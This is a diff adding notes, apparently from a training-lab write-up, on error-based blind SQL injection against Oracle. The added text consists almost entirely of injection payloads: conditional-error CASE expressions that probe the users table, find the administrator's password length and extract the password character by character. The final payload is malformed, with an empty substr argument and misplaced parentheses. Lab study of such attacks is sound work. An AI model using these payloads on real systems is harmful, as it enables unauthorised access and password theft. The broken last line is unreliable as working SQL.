@@ -22,4 +22,12 @@ Analysis:
 
 case expression in orcacle
 
-' || (select CASE)'
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'
+
+4) Determine the length of password
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) ||'
+
+5) Output the administrator password
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') and substr(password,,1)='a' ||'
